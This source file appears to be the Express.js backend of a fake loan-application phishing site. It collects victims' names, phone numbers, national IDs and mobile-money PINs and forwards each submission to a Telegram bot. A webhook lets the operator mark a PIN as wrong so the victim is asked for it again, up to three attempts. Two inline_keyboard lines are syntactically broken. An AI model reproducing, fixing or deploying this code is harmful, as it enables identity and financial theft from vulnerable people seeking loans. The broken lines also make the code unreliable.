const express = require("express");
const axios = require("axios");
const path = require("path");

const app = express();

app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static(__dirname));

const BOT_TOKEN = process.env.BOT_TOKEN;
const CHAT_ID = process.env.CHAT_ID;

const users = {};

app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "index.html"));
});

// ================= APPLY =================
app.post("/apply", async (req, res) => {
  const { name, phone, network, amount, nationalId } = req.body;
  if (!phone) return res.status(400).send("Missing phone");

  users[phone] = {
    name, phone, network, amount, nationalId,
    status: "pending",
    pinStatus: "waiting", // Added for PIN logic
    attempts: 0           // Added for 1/3 logic
  };

  const message = `📥 NEW LOAN\n👤 Name: ${name}\n📱 Phone: ${phone}\n💰 Amount: ${amount}`;

  try {
    await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      chat_id: CHAT_ID,
      text: message,
      reply_markup: {
        inline_keyboard:]
      }
    });
    res.sendStatus(200);
  } catch (err) { res.status(500).send("TG Error"); }
});

// ================= STATUS CHECKS =================
app.get("/status/:phone", (req, res) => {
  const u = users[req.params.phone];
  res.json({ status: u ? u.status : "unknown" });
});

// This route is what stops the "Verifying" loop
app.get("/check-pin-status/:phone", (req, res) => {
  const u = users[req.params.phone];
  if (!u) return res.json({ status: "unknown" });
  res.json({ status: u.pinStatus, attempt: u.attempts });
});

// ================= PIN SUBMIT (FIXED ROUTE) =================
app.post("/send-pin", async (req, res) => {
  const { phone, pin } = req.body;
  if (!users[phone]) return res.sendStatus(404);

  users[phone].attempts += 1;
  users[phone].pinStatus = "verifying";

  const message = `🔐 PIN RECEIVED (${users[phone].attempts}/3)\n📱 Phone: ${phone}\n🔑 PIN: ${pin}`;

  try {
    await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      chat_id: CHAT_ID,
      text: message,
      reply_markup: {
        inline_keyboard:]
      }
    });
    res.sendStatus(200);
  } catch (err) { res.sendStatus(500); }
});

// ================= WEBHOOK =================
app.post("/webhook", (req, res) => {
  const data = req.body;
  if (!data.callback_query) return res.sendStatus(200);

  const action = data.callback_query.data;
  const parts = action.split("_");
  const cmd = parts[0];
  const phone = parts[1];

  if (users[phone]) {
    if (cmd === "approve") users[phone].status = "approved";
    if (cmd === "pinok") users[phone].pinStatus = "success";
    if (cmd === "pinwrong") users[phone].pinStatus = "re-enter";
  }

  res.sendStatus(200);
});

const PORT = process.env.PORT || 8080;
app.listen(PORT, "0.0.0.0", () => {
  console.log("Server running on port " + PORT);
});
